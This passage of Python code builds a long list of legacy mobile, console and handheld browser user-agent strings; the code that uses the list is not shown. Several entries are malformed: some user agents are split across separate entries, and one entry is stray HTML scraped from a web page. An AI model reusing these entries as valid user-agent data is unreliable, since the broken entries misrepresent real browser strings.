    headers.append("Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7498.EU")
    headers.append("Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7455.EU")
    headers.append("Opera/9.30 (Nintendo Wii; U; ; 2047-7; en)")
    headers.append("Opera/9.10 (Nintendo Wii; U; ; 1621; en)")
    headers.append("Opera/9.00 (Nintendo Wii; U; ; 1309-9; en)")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Nitro) Opera 8.50 [en")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Nitro) Opera 8.50 [ja]")
    headers.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; NOKIA; Lumia 710)")
    headers.append("Nokia2700c-2/2.0 (09.80) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0(Java; U; MIDP-2.0; en-US; nokia2700c-2) U2/1.0.0 UCBrowser/8.8.1.252 U2/1.0.0 Mobile")
    headers.append("Nokia2760/2.0 (06.82) Profile/MIDP-2.1 Configuration/CLDC-1.1")
    headers.append("Nokia2700c-2/2.0 (07.80) Profile/MIDP-2.1 Configuration/CLDC-1.1 nokia2700c-2/UC Browser7.7.1.88/69/444 UNTRUSTED/1.0")
    headers.append("Opera/9.80 (J2ME/MIDP; Opera Mini/4.1.15082/22.414; U; en) Presto/2.5.25 Version/10.54")
    headers.append("Nokia3120Classic/2.0 (06.20) Profile/MIDP-2.1 Configuration/CLDC-1.1")
    headers.append("Opera/8.0.1 (J2ME/MIDP; Opera Mini/3.1.9427/1724; en; U; ssr)")
    headers.append("Nokia3200/1.0 (5.29) Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Link/6.3.1.13.0")
    headers.append("Nokia3510i/1.0 (04.44) Profile/MIDP-1.0 Configuration/CLDC-1.0")
    headers.append("Nokia3650/1.0 SymbianOS/6.1 Series60/1.2 Profile/MIDP-1.0 Configuration/CLDC-1.0")
    headers.append("Mozilla/4.0 (compatible; MSIE 4.0; SmartPhone; Symbian OS/1.1.0) Netfront/3.1")
    headers.append("Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4 3gpp-gba")
    headers.append("Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5230/40.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.4 3gpp-gba")
    headers.append("Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/50.0.005; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.3")
    headers.append("Nokia5130c-2/2.0 (07.97) Profile/MIDP-2.1 Configuration/CLDC-1.1 nokia5130c-2/UC Browser7.5.1.77/69/351 UNTRUSTED/1.0")
    headers.append("Nokia5140/2.0 (3.10) Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("Mozilla/5.0 (SymbianOS/9.4; U; Series60/5.0 Nokia5800d-1b/20.2.014; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413")
    headers.append("Nokia6212 classic/2.0 (06.20) Profile/MIDP-2.1 Configuration/CLDC-1.1")
    headers.append("Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia6120c/3.83; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; Nokia 6680/5.04.07; 9399) Opera 8.65 [en]")
    headers.append("Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es61i")
    headers.append("Nokia6230/2.0+(04.43)+Profile/MIDP-2.0+Configuration/CLDC-1.1+UP.Link/6.3.0.0.0")
    headers.append("Nokia6630/1.0 (2.3.129) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 6600;432) Opera 6.10 [en]")
    headers.append("Nokia6600/1.0 (5.27.0) SymbianOS/7.0s Series60/2.0 Profile/MIDP-2.0 Configuration/CLDC-1")
    headers.append("Nokia6680/1.0 (4.04.07) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 6600;452) Opera 6.20  [en-US]")
    headers.append("Nokia6800/2.0 (4.17) Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Link/5.1.2.9")
    headers.append("Nokia7610/2.0 (7.0642.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0/UC Browser7.9.1.120/27/351/UCWEB")
    headers.append("Nokia7250I/1.0 (3.22) Profile/MIDP-1.0 Configuration/CLDC-1.0")
    headers.append("Nokia7250/1.0 (3.14) Profile/MIDP-1.0 Configuration/CLDC-1.0")
    headers.append("Nokia7610/2.0 (5.0509.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0")
    headers.append("Nokia8310/1.0 (05.11) UP.Link/6.5.0.0.06.5.0.0.06.5.0.0.06.5.0.0.0")
    headers.append("Mozilla/4.0 (compatible; MSIE 5.0; Symbian )S)")
    headers.append("Opera 6.0[en]Nokia/Series-9300")
    headers.append("Mozilla/4.0 (compatible; MSIE 5.0; Series80/2.0 Nokia9300/05.22 Profile/MIDP-2.0 Configuration/CLDC-1.1)")
    headers.append("Mozilla/4.0 (compatible; MSIE 5.0; Series80/2.0 Nokia9500/4.51 Profile/MIDP-2.0 Configuration/CLDC-1.1)")
    headers.append("NokiaC3-00/5.0 (04.60) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
    headers.append("Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE55-1/034.001; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.1.5")
    headers.append("Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; en-GB) Presto/2.4.18 Version/10.00")
    headers.append("Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es61i")
    headers.append("Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.13918/488; U; en) Presto/2.2.0")
    headers.append("Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE63-3/100.21.110; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413")
    headers.append("Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413")
    headers.append("Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE90-1/07.24.0.3; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.2.3.18.0")
    headers.append("Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13")
    headers.append("NokiaN70-1/5.0737.3.0.1 Series60/2.8 Profile/MIDP-2.0 Configuration/CLDC-1.1/UC Browser7.8.0.95/27/352")
    headers.append("Mozilla/5.0 (SymbianOS/9.3; U; Series60/3.2 NokiaN79-1/32.001; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413")
    headers.append("Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/20.0.019; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.1.18124")
    headers.append("Mozilla/5.0 (SymbianOS/9.3; U; Series60/3.2 NokiaN85-1/31.002; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413")
    headers.append("Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1")
    headers.append("Mozilla/5.0 (X11; U; Linux armv7l; en-GB; rv:1.9.2a1pre) Gecko/20090928 Firefox/3.5 Maemo Browser 1.4.1.22 RX-51 N900")
    headers.append("Mozilla/5.0 (X11; U; Linux armv6l; en-us) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) tear")
    headers.append("Mozilla/5.0 (X11; U; Linux armv6l; en-us) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) midori")
    headers.append("Links (2.1pre31; Linux 2.6.21-omap1 armv6l; x)")
    headers.append("Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv: 1.9.1a2pre) Gecko/20080813221937 Prism/0.9.1")
    headers.append("Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9a6pre) Gecko/20070810 Firefox/3.0a1 Tablet browser 0.1.16 RX-34_2007SE_4.2007.38-2")
    headers.append("Opera/9.50 (J2ME/MIDP; Opera Mini/4.1.10781/298; U; en)")
    headers.append("Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE71-1/100.07.76; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; ; Linux armv5tejl; U) Opera 8.02 [en_US] Maemo browser 0.4.31 N770/SU-18")
    headers.append("NokiaN80-3/1.0552.0.7Series60/3.0Profile/MIDP-2.0Configuration/CLDC-1.1")
    headers.append("Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413")
    headers.append("Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9a6pre) Gecko/20070807 Firefox/3.0a1 Tablet browser 0.1.16 RX-34_2007SE_4.2007.26-8")
    headers.append("NokiaN90-1/3.0545.5.1 Series60/2.8 Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95/10.0.018;")
    headers.append("Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413")
    headers.append("(KHTML, like Gecko) Safari/413")
    headers.append("NokiaX3-02/5.0 (05.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0/p>")
    headers.append("<p><b>Explanation:</b> A Nokia X3. String from Ranbdr Ghale - thanks.")
    headers.append("NokiaN-Gage/1.0 SymbianOS/6.1 Series60/1.2 Profile/MIDP-1.0 Configuration/CLDC-1.0")
    headers.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17")
    headers.append("nook browser/1.0")
    headers.append("Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; SPV M700; OpVer 19.123.1.615)")
    headers.append("Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone; 240x320; SPV C600; OpVer 11.1.3.5)")
    headers.append("Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; SPV M2000; OpVer 5.31.1.124)")
    headers.append("Mozilla/5.0 (webOS/1.4.5; U; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Version/1.0 Safari/532.2 Pre/1.0")
    headers.append("PalmCentro/v0001 Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/Palm-D061; Blazer/4.5) 16;320x320")
    headers.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0; Palm-Arz1)")
    headers.append("Mozilla/5.0 (webOS/1.3; U; en-US) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/1.0 Safari/525.27.1 Desktop/1.0")
    headers.append("Mozilla/5.0 (webOS/1.0; U; en-US) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/1.0 Safari/525.27.1 Pre/1.0")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.12) /Palm 500v/v0100 UP.Link/6.3.1.13.0")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/Palm-D062; Blazer/4.5) 16;320x320")
    headers.append("Palm680/RC1 Mozilla/4.0 (compatible; MSIE 6.0; Windows 98;")
    headers.append("PalmSource/Palm-D053; Blazer/4.5) 16;320x320 UP.Link/6.3.1.17.06.3.1.17.0")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/Palm-D053; Blazer/4.5) 16;320x320 UP.Link/6.3.1.17.0")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/Palm-TunX; Blazer/4.3) 16;320x448")
    headers.append("Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/hspr-H102; Blazer/4.0) 16;320x320")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows 95; PalmSource; Blazer 3.0) 16;160x160")
    headers.append("UPG1 UP/4.0 (compatible; Blazer 1.0)")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/Palm-D050; Blazer/4.3) 16;320x320)")
    headers.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0; Palm-Arz1)")
    headers.append("Mozilla/4.76 (compatible; MSIE 6.0; U; Windows 95; PalmSource; PalmOS; WebPro; Tungsten Proxyless 1.1 320x320x16)")
    headers.append("Mozilla/4.0 (compatible;MSIE 6.0;Windows95;PalmSource) Netfront/3.0;8;320x320")
    headers.append("Mozilla/4.0 (compatible;MSIE 6.0;Windows95;PalmSource) Netfront/3.0")
    headers.append("PantechP7040/JLUS04042011; Mozilla/5.0 (Profile/MIDP-2.0 Configuration/CLDC-1.1; Opera Mini/att/4.2.16479; U; en-US) Opera 9.50")
    headers.append("MobileExplorer/3.00 (Mozilla/1.22; compatible; MMEF300; Amstrad; Gamma)")
    headers.append("Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)")
    headers.append("Mozilla/2.0 (compatible ; MSIE 3.02; Windows CE; PPC; 240x320)")
    headers.append("Mozilla/4.0(compatible; MSIE 4.01; Windows CE; PPC; 240x320)")
    headers.append("Mozilla/4.0(compatible; MSIE 4.01; Windows CE; PPC; 240x320)")
    headers.append("Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; RegKing; 240x320)")
    headers.append("SAGEM-myX5-2/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.0")
    headers.append("UP.Browser/6.2.2.6.d.3 (GUI) MMP/1.0")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.3.6; es-es; GT-I8160 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30")
    headers.append("Opera/9.80 (Android 4.1.2; Linux; Opera Mobi/ADR-1305251841) Presto/2.11.355 Version/12.10")
    headers.append("Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; GT-S6010 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; SCH-R720 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; SCH-I800 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (X11; CrOS armv7l 2913.260.0) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.99 Safari/537.11")
    headers.append("Mozilla/5.0 (Linux; U; Android 4.0.4; en-ca; SGH-I757M Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30")
    headers.append("SAMSUNG-SGH-A817/A817UCKG3; Mozilla/5.0 (Profile/MIDP-2.0 Configuration/CLDC-1.1; Opera Mini/att/4.2.21648; U; en-US) Opera 9.50")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; SPH-D700 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("SAMSUNG-GT-S3653W/S3653WJPJB3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 UNTRUSTED/1.0")
    headers.append("Mozilla/5.0 (Linux; U; Android 4.0.3; nl-nl; GT-I9000 Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30")
    headers.append("SAMSUNG-SGH-A797/A797UCIIB SHP/VPP/R5 NetFront/3.5 SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1")
    headers.append("SAMSUNG-SGH-A927/A927UCJF5; Mozilla/5.0 (Profile/MIDP-2.0 Configuration/CLDC-1.1; Opera Mini/att/4.2.19039; U; en-KR) Opera 9.50")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.3.5; de-de; SAMSUNG GT-S5830/S5830BUKS2 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; GT-I9000 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("SAMSUNG-GT-S3310/1.0 SHP/VPP/R5 NetFront/3.4 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2; en-us; SGH-T959 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko Version/4.0 Mobile Safari/533.1")
    headers.append("sam-r380 UP.Browser/6.2.3.8 (GUI) MMP/2.0")
    headers.append("samsung-gt-s5620/UC Browser7.9.0.102/69/352 UNTRUSTED/1.0")
    headers.append("sam-r350 UP.Browser/6.2.3.8 (GUI) MMP/2.0")
    headers.append("SAMSUNG-S8003/1.0 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1")
    headers.append("SAMSUNG-GT-S3310/1.0 SHP/VPP/R5 NetFront/3.4 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.3.5; en-gb; GT-I9220 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("SAMSUNG-SGH-T401G/T401UDJD2 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1[TF356986033869900000000017602160239]")
    headers.append("samr810 Netfront/3.4 Mozilla/5.0 like Gecko/20060426")
    headers.append("SAMSUNG-SGH-i900/1.0 (compatible; MSIE 4.01; Windows CE; PPC)/UC Browser7.7.1.88")
    headers.append("Mozilla/5.0 (Linux; U; Android 3.0.1; de-de; GT-P7100 Build/HRI83) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 MobileSafari/534.13")
    headers.append("SAMSUNG-GT-S3310/1.0 SHP/VPP/R5 NetFront/3.4 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1")
    headers.append("Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S8530/S8530XXJKA; U; Bada/1.2; de-de) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/2.2 Mobile WVGA SMM-MMS/1.2.0 OPN-B")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2;es-es;GT-I5500 Build/ FROYO) AppleWebKit/533.1 (KHTML, like Geccko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S8500/S8500XXJL2; U; Bada/1.2; fr-fr) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/2.2 Mobile WVGA SMM-MMS/1.2.0 OPN-B")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2; en-us; SCH-I800 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2; en-ca; SGH-T959D Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/4.0 (BREW 3.1.5; U; en-us; Samsung; PLS_M330; POLARIS/6.1/WAP) MMP/2.0 Configuration/CLDC-1.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2; en-gb; GT-P1000 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.0.1; en-us; Droid Build/ESD56) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17")
    headers.append("Samsung-SPHM800 AU-MIC-M800/2.0 MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UNTRUSTED/1.0")
    headers.append("SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0")
    headers.append("samsung sgh-e900 /netfront 3.2")
    headers.append("TELECA-/2.0 (BREW 3.1.5; U; EN-US;SAMSUNG; SPH-M800; Teleca/Q05A/INT) MMP/2.0 Profile/MIDP-2.1 Configuration/CLDC-1.1")
    headers.append("Mozilla/4.1 (U; BREW 3.1.5; en-US; Teleca/Q05A/INT)")
    headers.append("SAMSUNG-SGH-A737/UCGI3 SHP/VPP/R5 NetFront/3.4 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0")
    headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)")
    headers.append("SCH-A950+UP.Browser/6.2.3.2+(GUI)+MMP/2.0")
    headers.append("SAMSUNG-SGH-D900/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0")
    headers.append("SAMSUNG-SGH-D900/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 UP.Link/6.3.1.12.0")
    headers.append("SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)")
    headers.append("SEC-SGHE600 UP.Link/6.3.1.12.0")
    headers.append("SEC-SGH600")
    headers.append("SEC-SGHD410")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; j2me) ReqwirelessWeb/3.5")
    headers.append("AU-MIC/1.1.4.0 20722 MMP/2.0")
    headers.append("OPENWAVE UNTRUSTED/1.0")
    headers.append("Mozilla/4.0 (BREW 3.1.5; U; en-us; Sanyo; NetFront/3.5.1/AMB) Boost SCP6760")
    headers.append("Opera/9.50 (J2ME/MIDP; Opera Mini/4.0.10031/230; U; en)")
    headers.append("Vodafone/1.0/703SH/SHG001 Browser/UP.Browser/7.0.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 Ext-J-Profile/JSCL-1.2.2 Ext-V-Profile/VSCL-2.0.0")
    headers.append("SHARP-TQ-GX10i/1.0 Profile/MIDP-1.0 Configuration/CLDC-1.0  UP.Browser/6.1.0.6.1.d.1 (GUI) MMP/1.0")
    headers.append("Mozilla/4.0 (compatible; MSIE 5.0; Linux 2.4.18-rmk7-pxa3-embedix armv5tel; 480x640) Opera 6.0 [en]")
    headers.append("SIE-S65/12 UP.Browser/7.0.0.1.c3 (GUI) MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/5.1.2.16")
    headers.append("SIE-ME45/05 UP.Browser/5.0.1.1.102 (GUI)")
    headers.append("SIE-S55/16 UP.Browser/6.1.0.5.c.4 (GUI) MMP/1.0 UP.Link/5.1.2.10")
    headers.append("ReqwirelessWeb/3.2 S55")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.3.4; en-ca; SonyEricssonMK16a Build/4.0.2.A.0.58) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Java; U; en-us; sonyericssonk800i) UCBrowser8.2.1.144/70/352/UCWEB Mobile")
    headers.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2) UCBrowser8.2.1.144/70/352")
    headers.append("Opera/9.80 (J2ME/MIDP; Opera Mini/7.28870/27.1530; U; en)")
    headers.append("Presto/2.8.119 Version/11.10")
    headers.append("SonyEricssonT280i/R1CB002 TelecaBrowser/Q04C1-1 Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("Opera/9.80 (J2ME/MIDP; Opera Mini/6.5.26955/26.1283; U; en) Presto/2.8.119 Version/10.54")
    headers.append("sonyericssonk800i/UC Browser8.0.3.107/70/352")
    headers.append("sonyericssonk800i/UC Browser7.9.0.102/70/352")
    headers.append("Mozilla/5.0 (Linux; U; Android 1.6; de-de; SonyEricssonU20i Build/1.1.A.0.8) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1")
    headers.append("Opera/9.80 (J2ME/MIDP; Opera Mini/6.0.24093/24.741; U; en) Presto/2.5.25 Version/10.54")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.1-update1; de-de; E10i Build/2.0.2.A.0.24) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17")
    headers.append("Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.22296/22.414; U; en) Presto/2.5.25 Version/10.54")
    headers.append("SonyEricssonG700/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 958) Opera 8.65 [ru]")
    headers.append("SonyEricssonW595/R3EA Browser/NetFront/3.4 Profile/MIDP-2.1 Configuration/CLDC-1.1 JavaPlatform/JP-8.3.3")
    headers.append("SonyEricssonK800i/R8BF Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.16823/1428; U; en) Presto/2.2.0")
    headers.append("Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.13337/504; U; en) Presto/2.2.0")
    headers.append("SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("SonyEricssonK608i/R2L/SN356841000828910")
    headers.append("Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("SonyEricssonK550i/R1JD Browser/NetFront/3.3")
    headers.append("Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("SonyEricssonW850i/R1ED Browser/NetFront/3.3")
    headers.append("Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1558; en; U; ssr)")
    headers.append("SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.2.3.15.0")
    headers.append("Opera/8.01 (J2ME/MIDP; Opera Mini/1.0.1479/HiFi; SonyEricsson P900; no; U; ssr)")
    headers.append("SonyEricssonK700i/R2N SEMC-Browser/4.0.1 Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("Opera/8.01 (J2ME/MIDP; Opera Mini/1.0.1479/HiFi; SonyEricsson P900; no; U; ssr)")
    headers.append("SonyEricssonP1i/R100 Mozilla 4.0 (compatibile; MSIE 6.0; Symbian OS;768) Opera 8.65 [hr]")
    headers.append("SonyEricssonT200/R101")
    headers.append("Mozilla/4.1 (compatible; MSIE5.0; Symbian OS); Opera 6.02 [de]")
    headers.append("Mozilla/5.0 (Linux; U; Android 3.2; de-de; Sony Tablet P Build/THMD01900) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13")
    headers.append("Mozilla/5.0 (Linux; U; Android 3.2; en-gb; Sony Tablet S Build/THMD01900) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13")
    headers.append("Mozilla/5.0 (PLAYSTATION 3; 1.00)")
    headers.append("Mozilla/4.0 (PSP (PlayStation Portable); 2.00)")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.6) (compatible; MSIE 6.0; Windows CE; IEMobile 7.11) Sprint:PPC6800")
